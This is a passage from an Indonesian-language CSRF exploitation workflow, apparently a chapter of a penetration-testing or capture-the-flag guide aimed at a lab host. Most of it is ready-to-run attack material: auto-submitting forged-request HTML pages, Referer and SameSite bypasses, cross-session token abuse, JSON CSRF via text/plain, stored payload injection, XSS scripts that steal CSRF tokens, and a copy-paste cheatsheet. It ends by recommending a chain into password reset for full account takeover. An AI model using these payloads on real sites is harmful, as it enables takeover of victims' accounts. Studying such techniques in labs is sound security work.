    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer: http://attacker.evil.com" \
    --data-urlencode "email=test@evil.com"

# Test 4: Subdomain trick (contains target domain string)
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer: http://target.htb.attacker.evil.com" \
    --data-urlencode "email=test@evil.com"
```

**OUTPUT: Referer tidak dicek — request sukses tanpa Referer ✅:**

http

```
HTTP/1.1 302 Found
```

➡️ Bisa pakai PoC dengan `<meta name="referrer" content="no-referrer">` → Teknik 2.8

**OUTPUT: Lenient Referer check — substring match ✅:**

text

```
Referer: http://target.htb.attacker.evil.com → ACCEPTED
```

➡️ Server cuma cek apakah "target.htb" ada di string Referer → Bypass possible

**OUTPUT: Strict Referer check ❌:**

http

```
HTTP/1.1 403 Forbidden
Invalid referer
```

➡️ Harus kirim dari same-origin. Perlu XSS atau primitive lain.

---

## ═══════════════════════════════════════

## FASE 2: EXPLOITATION PATHS

## ═══════════════════════════════════════

### PATH A — Basic CSRF POST (No Token / Token Not Validated)

> Prasyarat: Token tidak ada atau tidak divalidasi (Langkah 1.1 berhasil)

Bash

```
# Buat PoC HTML
cat > ~/csrf_lab/poc/csrf_basic_post.html << 'EOF'
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CSRF PoC</title>
</head>
<body>
<form id="csrf-form"
      action="http://TARGET_PLACEHOLDER/my-account/change-email"
      method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
    document.getElementById("csrf-form").submit();
</script>
</body>
</html>
EOF

# Ganti TARGET_PLACEHOLDER dengan target sebenarnya
sed -i "s|TARGET_PLACEHOLDER|${TARGET}|g" ~/csrf_lab/poc/csrf_basic_post.html

# Host PoC
cd ~/csrf_lab/poc
python3 -m http.server 8000
```

**OUTPUT BERHASIL ✅ — Server running:**

text

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Bash

```
# Verify dengan curl (simulasi victim browser yang sudah login)
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: http://attacker.evil.com" \
    --data-urlencode "email=attacker@evil.com"
```

**OUTPUT BERHASIL ✅ — State berubah:**

http

```
HTTP/1.1 302 Found
Location: /my-account
```

Bash

```
# Verifikasi email benar-benar berubah
curl -s "$TARGET/my-account" -H "Cookie: session=$SESSION" | grep -i "email"
```

**OUTPUT KONFIRMASI ✅:**

HTML

```
<span>attacker@evil.com</span>
```

➡️ **CSRF BERHASIL!** Dokumentasikan evidence.

**OUTPUT GAGAL ❌ — CORS atau SameSite blokir:**

text

```
# curl berhasil tapi browser tidak
# → Masalah ada di browser cookie policy, bukan di server
```

➡️ Perlu verifikasi via browser langsung. Jika SameSite=Lax, coba PATH B (GET).

---

### PATH B — Basic CSRF GET (State-Changing GET Endpoint)

> Prasyarat: Ada endpoint GET yang mengubah state (bad practice tapi ada di wild)

Bash

```
# Test apakah endpoint menerima GET
curl -i -X GET "$TARGET/my-account/change-email?email=test@evil.com" \
    -H "Cookie: session=$SESSION"
```

**OUTPUT BERHASIL ✅ — GET diterima dan state berubah:**

http

```
HTTP/1.1 302 Found
Location: /my-account
```

Bash

```
# Buat PoC dengan img tag (browser auto-request)
cat > ~/csrf_lab/poc/csrf_get.html << EOF
<!doctype html>
<html>
<body>
<!-- Img trick: browser langsung fetch URL ini -->
<img src="$TARGET/my-account/change-email?email=attacker@evil.com" alt="">
<!-- Atau dengan anchor jika butuh user click -->
<a href="$TARGET/delete-account">Click here for prize!</a>
<!-- Atau auto-navigate -->
<script>
window.location = "$TARGET/my-account/change-email?email=attacker@evil.com";
</script>
</body>
</html>
EOF

# Host
cd ~/csrf_lab/poc
python3 -m http.server 8000
```

**Keunggulan GET CSRF:** Juga bekerja dengan SameSite=Lax (top-level navigation GET).

**OUTPUT GAGAL ❌ — Endpoint menolak GET:**

http

```
HTTP/1.1 405 Method Not Allowed
```

➡️ Tidak bisa pakai GET. Coba method override di PATH C.

---

### PATH C — Method Override Bypass

Bash

```
# Test apakah framework support _method override
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "_method=GET" \
    --data-urlencode "email=test@evil.com"

# Atau X-HTTP-Method-Override header
curl -i -X GET "$TARGET/my-account/change-email?email=test@evil.com" \
    -H "Cookie: session=$SESSION" \
    -H "X-HTTP-Method-Override: POST"
```

**OUTPUT BERHASIL ✅ — Method override diterima:**

http

```
HTTP/1.1 302 Found
```

➡️ Framework menginterpretasikan `_method` sebagai method sebenarnya.  
Buat PoC GET form yang include `_method=POST` → bypass SameSite Lax check untuk POST.

---

### PATH D — Token Not Tied to Session

> Prasyarat: Langkah 1.2 menunjukkan cross-session token diterima

Bash

```
# Step 1: Dapatkan token dari akun attacker
TOKEN_A=$(curl -s "$TARGET/my-account" \
    -H "Cookie: session=$SESSION_A" | \
    grep -oP '(?<=name="csrf" value=")[^"]+')

echo "[*] Attacker token: $TOKEN_A"

# Step 2: Buat PoC yang embed token attacker
cat > ~/csrf_lab/poc/csrf_token_not_tied.html << EOF
<!doctype html>
<html>
<body>
<form id="csrf"
      action="$TARGET/my-account/change-email"
      method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- Gunakan token dari sesi attacker, bukan victim -->
    <input type="hidden" name="csrf" value="$TOKEN_A">
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>
EOF

python3 -m http.server 8000
```

**Cara verifikasi:**

Bash

```
# Simulasi victim menggunakan PoC dengan session victim + token attacker
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION_B" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "email=attacker@evil.com" \
    --data-urlencode "csrf=$TOKEN_A"
```

**OUTPUT BERHASIL ✅:**

http

```
HTTP/1.1 302 Found
```

➡️ **VULNERABLE!** Token tidak di-bind ke session.

---

### PATH E — Referer-Based Bypass

Bash

```
# Teknik 1: Suppress Referer (Referrer-Policy: no-referrer)
cat > ~/csrf_lab/poc/csrf_no_referer.html << EOF
<!doctype html>
<html>
<head>
    <!-- Suppress Referer header sepenuhnya -->
    <meta name="referrer" content="no-referrer">
</head>
<body>
<form id="csrf"
      action="$TARGET/my-account/change-email"
      method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>
EOF

# Teknik 2: Lenient subdomain check bypass
# Jika server hanya cek "target.htb" ada di Referer string:
cat > ~/csrf_lab/poc/csrf_referer_bypass.html << EOF
<!doctype html>
<!-- Tempatkan file ini di: http://attacker.evil.com/target.htb/csrf.html -->
<!-- Referer akan menjadi: http://attacker.evil.com/target.htb/csrf.html -->
<!-- Jika server cuma cek "contains target.htb" → bypass! -->
<html>
<body>
<form id="csrf"
      action="$TARGET/my-account/change-email"
      method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>
EOF
```

**Verifikasi lenient check:**

Bash

```
curl -i -X POST "$TARGET/my-account/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer: http://attacker.evil.com/target.htb/path" \
    --data-urlencode "email=attacker@evil.com"
```

**OUTPUT BERHASIL ✅ — Lenient check bypass:**

http

```
HTTP/1.1 302 Found
```

➡️ Host file di path yang mengandung nama domain target.

---

### PATH F — SameSite Lax + Chrome Grace Period

> Berlaku untuk cookie baru yang dibuat < 2 menit lalu (Chrome-specific)

Bash

```
# Step 1: Force victim untuk mendapat fresh session (Login CSRF)
cat > ~/csrf_lab/poc/csrf_grace_period.html << 'EOF'
<!doctype html>
<html>
<body>
<script>
// Step 1: Force login untuk mendapat fresh cookie (< 2 menit)
// Trigger dengan window.open atau form submit ke /login
var loginForm = document.createElement('form');
loginForm.action = 'http://TARGET/login';
loginForm.method = 'POST';

var user = document.createElement('input');
user.name = 'username'; user.value = 'carlos';
var pass = document.createElement('input');
pass.name = 'password'; pass.value = 'montoya';

loginForm.appendChild(user);
loginForm.appendChild(pass);
document.body.appendChild(loginForm);

// Login dulu
loginForm.submit();

// Step 2: Dalam < 2 menit, trigger CSRF POST
// Chrome masih kirim cookie Lax untuk fresh cookie
setTimeout(function() {
    var csrfForm = document.createElement('form');
    csrfForm.action = 'http://TARGET/my-account/change-email';
    csrfForm.method = 'POST';
    
    var email = document.createElement('input');
    email.name = 'email';
    email.value = 'attacker@evil.com';
    
    csrfForm.appendChild(email);
    document.body.appendChild(csrfForm);
    csrfForm.submit();
}, 500); // 0.5 detik setelah login → masih dalam grace period
</script>
</body>
</html>
EOF
```

> **Note:** Cek di DevTools → Application → Cookies → lihat timestamp cookie creation.

---

### PATH G — JSON CSRF

> Prasyarat: API menerima JSON, tidak ada CORS yang ketat, atau server mem-parse body apapun

Bash

```
# Test 1: Apakah server menerima text/plain tapi parse sebagai JSON?
curl -i -X POST "$TARGET/api/change-email" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: text/plain" \
    --data '{"email":"attacker@evil.com"}'
```

**OUTPUT BERHASIL ✅ — text/plain diterima dan di-parse sebagai JSON:**

http

```
HTTP/1.1 200 OK
{"message":"Email updated"}
```

Bash

```
# Buat PoC dengan form enctype=text/plain (trick untuk JSON-like body)
cat > ~/csrf_lab/poc/csrf_json.html << 'EOF'
<!doctype html>
<html>
<body>
<!-- text/plain enctype: form value jadi body -->
<!-- name={"email":"attacker@evil.com","x":" dan value="} -->
<!-- Body yang terkirim: {"email":"attacker@evil.com","x":"="} -->
<form id="csrf"
      action="http://TARGET/api/change-email"
      method="POST"
      enctype="text/plain">
    <input type="hidden"
           name='{"email":"attacker@evil.com","ignore":"'
           value='"}'>
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>
EOF
```

**Body yang dikirim browser:**

text

```
{"email":"attacker@evil.com","ignore":"="}
```

➡️ Jika server liberal dalam parsing JSON → email berubah.

**OUTPUT GAGAL ❌ — Server reject Content-Type bukan application/json:**

http

```
HTTP/1.1 415 Unsupported Media Type
```

➡️ Server ketat. Butuh CORS misconfiguration atau XSS untuk kirim `application/json` cross-origin.

---

### PATH H — Stored CSRF (via XSS injection point)

Bash

```
# Jika ada input yang tersimpan dan di-render ke user lain (comment, profile, etc)
# Inject auto-submit form ke stored field

PAYLOAD='<form action="http://TARGET/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>'

# Submit ke comment/profile yang dilihat admin
curl -i -X POST "$TARGET/post/comment" \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "comment=$PAYLOAD" \
    --data-urlencode "postId=1"
```

**OUTPUT BERHASIL ✅ — Comment tersimpan:**

http

```
HTTP/1.1 302 Found
```

Bash

```
# Verifikasi — cek apakah payload tersimpan dan tidak di-encode
curl -s "$TARGET/post?postId=1" | grep -A5 "csrf"
```

**OUTPUT BERHASIL ✅ — Payload tidak di-sanitize:**

HTML

```
<p><form action="http://target.htb/my-account/change-email" ...
```

➡️ Ketika admin/victim membuka halaman ini, form auto-submit.

**OUTPUT GAGAL ❌ — Payload di-HTML encode:**

HTML

```
<p>&lt;form action=...&gt;</p>
```

➡️ XSS/HTML injection diblokir. Butuh bypass XSS dulu → `<a href="/docs/xss" class="text-[#00b4d8] hover:underline font-mono font-semibold">20_xss_workflow.md</a>`

---

## ═══════════════════════════════════════

## FASE 3: CHAINED ATTACKS

## ═══════════════════════════════════════

### Teknik 3.1 — CSRF + XSS (Bypass SameSite via Same-Origin Script)

> Digunakan ketika SameSite=Strict atau token valid, tapi ada XSS di target

Bash

```
# Jika ada reflected XSS di target.htb, payload bisa:
XSS_PAYLOAD="<script>
fetch('/my-account/change-email', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=attacker%40evil.com'
});
</script>"

# URL encode payload untuk reflected XSS
python3 -c "import urllib.parse; print(urllib.parse.quote('$XSS_PAYLOAD'))"
```

**URL untuk trigger reflected XSS + CSRF:**

text

```
http://target.htb/search?q=<script>fetch('/my-account/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker%40evil.com'});</script>
```

Bash

```
# Jika butuh token dari DOM dulu, XSS untuk steal token lalu gunakan:
XSS_STEAL_TOKEN="<script>
fetch('/my-account').then(r=>r.text()).then(html=>{
    var token = html.match(/name=\"csrf\" value=\"([^\"]+)\"/)[1];
    fetch('/my-account/change-email', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'email=attacker%40evil.com&csrf=' + token
    });
});
</script>"
```

**Keunggulan:** Berjalan sebagai same-origin → bypass SameSite=Strict, bypass CSRF token, bypass Origin/Referer check.

**OUTPUT BERHASIL ✅:**

Bash

```
# Verifikasi setelah trigger XSS payload
curl -s "$TARGET/my-account" -H "Cookie: session=$SESSION_VICTIM" | grep email
# Harus menampilkan: attacker@evil.com
```

---

### Teknik 3.2 — CSRF + OAuth State Parameter Bypass

Bash

```
# OAuth login flow tanpa state parameter = vulnerable Login CSRF
# Step 1: Attacker mulai OAuth flow, catat authorization URL
# Step 2: Drop request SEBELUM redirect ke provider
# Step 3: Paksa victim buka authorization URL dengan attacker's state

# Cek apakah OAuth callback ada state parameter
curl -s "$TARGET/oauth-callback?code=AUTH_CODE&state=RANDOM" \
    -H "Cookie: session=$SESSION"

# Jika state tidak divalidasi → Login CSRF possible
cat > ~/csrf_lab/poc/oauth_csrf.html << 'EOF'
<!doctype html>
<html>
<body>
<!-- Paksa victim menggunakan attacker's OAuth code -->
<img src="http://TARGET/oauth-callback?code=ATTACKER_CODE" alt="">
</body>
</html>
EOF
```

---

## ═══════════════════════════════════════

## FASE 4: VERIFIKASI DAN DOKUMENTASI

## ═══════════════════════════════════════

### Langkah 4.1 — Konfirmasi State Change

Bash

```
# WAJIB: Jangan percaya hanya dari HTTP 302/200
# Verifikasi state benar-benar berubah

# Cek email yang aktif sekarang
curl -s "$TARGET/my-account" \
    -H "Cookie: session=$SESSION_VICTIM" | \
    grep -iE "(email|username|profile)"

# Atau cek via API jika ada
curl -s "$TARGET/api/user/profile" \
    -H "Cookie: session=$SESSION_VICTIM" | python3 -m json.tool
```

**OUTPUT KONFIRMASI BERHASIL ✅:**

HTML

```
<span id="user-email">attacker@evil.com</span>
```

atau

JSON

```
{
    "email": "attacker@evil.com",
    "username": "victim"
}
```

**OUTPUT GAGAL ❌ — Email tidak berubah:**

HTML

```
<span id="user-email">victim@original.com</span>
```

➡️ State tidak berubah walaupun dapat 302. Cek apakah ada additional validation (captcha, re-auth, dsb).

---

### Langkah 4.2 — Simpan Evidence

Bash

```
# Simpan semua evidence
mkdir -p ~/csrf_lab/evidence

# Save request yang vulnerable
cat > ~/csrf_lab/evidence/vulnerable_request.txt << EOF
=== VULNERABLE REQUEST ===
POST /my-account/change-email HTTP/1.1
Host: target.htb
Cookie: session=VICTIM_SESSION
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
[NO CSRF TOKEN REQUIRED / TOKEN NOT VALIDATED]

=== RESPONSE ===
HTTP/1.1 302 Found
Location: /my-account

=== PROOF ===
State changed: victim email → attacker@evil.com
EOF

# Simpan PoC yang berhasil
cp ~/csrf_lab/poc/csrf_basic_post.html ~/csrf_lab/evidence/working_poc.html

echo "[+] Evidence saved to ~/csrf_lab/evidence/"
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error/Situasi|Penyebab|Solusi|
|---|---|---|
|`403 Forbidden` saat remove token|Token validation aktif|Test token binding (Langkah 1.2)|
|`403 Forbidden` walaupun token valid|Token tied ke session berbeda|Ambil token dari session victim sendiri|
|Form submit tapi email tidak berubah|SameSite blokir cookie|Verifikasi di browser lab yang sesungguhnya|
|curl berhasil tapi browser gagal|Browser cookie policy berbeda dari curl|Pakai browser untuk test, bukan curl saja|
|`400 Bad Request` untuk JSON|Wrong Content-Type|Coba `text/plain` trick|
|CORS preflight block|OPTIONS denied|Gunakan simple request (form, tidak pakai fetch dengan custom header)|
|SameSite=Strict, tidak bisa bypass|Sangat ketat|Cari XSS di target, gunakan same-origin attack|
|Token berubah setiap request|Per-request token|Harus ambil token fresh setiap kali → butuh XSS atau info leak|
|`Origin: null` dikirim browser|Sandboxed iframe|Coba tanpa iframe|
|Stored CSRF di-encode|HTML entity encoding|Cari XSS bypass atau gunakan vector lain|
|State tidak berubah setelah 302|Ada additional validation|Trace lengkap flow di Burp, cek semua redirect|
|Multi-step form gagal di step 2|Step 2 butuh token baru dari step 1|Gunakan JavaScript untuk ambil token step 1 lalu submit step 2|
|`Invalid Referer`|Strict Referer check|Test suppress Referer (`no-referrer` meta tag)|
|Login CSRF tidak persistent|Session rotation saat login|Verifikasi apakah session ID berubah setelah login|
|Chrome grace period tidak bekerja|Cookie sudah > 2 menit|Trigger fresh login dulu via Login CSRF|

---

## GOOGLE SEARCH HINTS — Ketika Buntu

text

```
# Jika token selalu berubah dan tidak bisa predict:
site:portswigger.net "csrf token" "tied to session"
"CSRF bypass 2024" site:github.com
"SameSite Lax bypass" portswigger

# Jika JSON request tidak bisa di-CSRF:
"JSON CSRF text/plain bypass"
"CSRF application/json bypass trick"

# Jika SameSite=Strict:
"SameSite Strict bypass subdomain" portswigger
"CSRF XSS chain SameSite Strict"

# Jika buntu total:
site:portswigger.net/web-security/csrf "lab" "solution"
"CSRF $TARGET_FRAMEWORK bypass" (Laravel/Django/Rails/Express)
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: State-Changing Endpoint Ditemukan
│
├─ FASE 0: Identifikasi endpoint & capture request
│
├─ FASE 1: Analisis Defense
│   ├─ [Token tidak ada/tidak divalidasi] → PATH A (Basic POST CSRF)
│   ├─ [Token tidak tied ke session]      → PATH D (Cross-session token)
│   ├─ [SameSite=None]                    → PATH A (cross-site cookie allowed)
│   ├─ [SameSite=Lax + state-changing GET]→ PATH B (GET CSRF)
│   ├─ [SameSite=Lax + fresh cookie]      → PATH F (Grace period)
│   ├─ [Referer not checked]              → PATH E1 (no-referrer meta)
│   ├─ [Referer lenient substring]        → PATH E2 (subdomain trick)
│   └─ [Semua defense ketat]              → Cari XSS → Teknik 3.1
│
├─ FASE 2: Exploitation
│   ├─ [POST form]   → auto-submit HTML form
│   ├─ [GET]         → img/anchor/window.location
│   ├─ [JSON API]    → text/plain trick atau fetch via XSS
│   └─ [Stored]      → inject payload ke stored content
│
├─ FASE 3: Chain jika perlu
│   ├─ [Butuh same-origin]    → XSS + CSRF chain
│   ├─ [OAuth flow]           → Login CSRF via state bypass
│   └─ [CORS misconfigured]   → Baca response + CSRF chain
│
└─ FASE 4: Verifikasi & Dokumentasi
    └─ [Konfirmasi state berubah] → Simpan evidence → DONE
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="http://target.htb"
export SESSION="VICTIM_SESSION_COOKIE"
export SESSION_A="ATTACKER_SESSION"
export SESSION_B="VICTIM_SESSION"
mkdir -p ~/csrf_lab/{poc,evidence,notes}

# === RECONNAISSANCE ===
# Temukan state-changing endpoints
ffuf -u "$TARGET/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200,301,302 -b "session=$SESSION"

# Cek cookie attributes
curl -si -X POST "$TARGET/login" --data "username=wiener&password=peter" | grep -i set-cookie

# === CSRF TOKEN TESTS ===
# Remove token
curl -si -X POST "$TARGET/endpoint" -H "Cookie: session=$SESSION" \
    --data-urlencode "email=test@evil.com"

# Invalid token
curl -si -X POST "$TARGET/endpoint" -H "Cookie: session=$SESSION" \
    --data-urlencode "email=test@evil.com" --data-urlencode "csrf=INVALID"

# Cross-session token (token A, session B)
curl -si -X POST "$TARGET/endpoint" -H "Cookie: session=$SESSION_B" \
    --data-urlencode "email=test@evil.com" --data-urlencode "csrf=$TOKEN_A"

# === REFERER TESTS ===
curl -si -X POST "$TARGET/endpoint" -H "Cookie: session=$SESSION" \
    -H "Referer: " --data-urlencode "email=test@evil.com"              # No referer
curl -si -X POST "$TARGET/endpoint" -H "Cookie: session=$SESSION" \
    -H "Referer: http://attacker.com/target.htb" --data-urlencode "email=test@evil.com"  # Subdomain trick

# === POC HOSTING ===
cd ~/csrf_lab/poc && python3 -m http.server 8000

# === VERIFY STATE CHANGE ===
curl -s "$TARGET/my-account" -H "Cookie: session=$SESSION" | grep -iE "(email|username)"

# === XSS + CSRF CHAIN (same-origin bypass) ===
# Payload untuk reflected XSS:
# <script>fetch('/endpoint',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker%40evil.com'})</script>

# === JSON CSRF ===
curl -si -X POST "$TARGET/api/endpoint" -H "Cookie: session=$SESSION" \
    -H "Content-Type: text/plain" --data '{"email":"attacker@evil.com"}'
```

---

> **➡️ NEXT:** Setelah berhasil exploit CSRF, jika email berhasil diubah ke [attacker@evil.com](mailto:attacker@evil.com) — lanjut ke **password reset flow** menggunakan email tersebut untuk full account takeover. Cross-reference ke **[🔥 20 — XSS Workflow](/docs/xss)** untuk chaining dengan XSS, dan **[🔐 34 — OAuth & SSO Workflow](/docs/oauth-sso)** untuk Login CSRF via OAuth state bypass.
> 
> **⬅️ PREV:** [🔐 28 — JWT Workflow](/docs/jwt) — JWT manipulation dan algorithm confusion.

[](https://messages-prod.27c852f3500f38c1e7786e2c9ff9e48f.r2.cloudflarestorage.com/aad5bafd-ac04-4d8f-9667-3d87b6995a58/1789120736363-29_csrf_workflow.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=b33de61d4f22a31b59b25364ab5037c5%2F20260911%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20260911T095858Z&X-Amz-Expires=3600&X-Amz-Signature=703281e20dac217a7896f28a0ce4c03c5d5a32f560d8131e3d635f3b012328b5&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)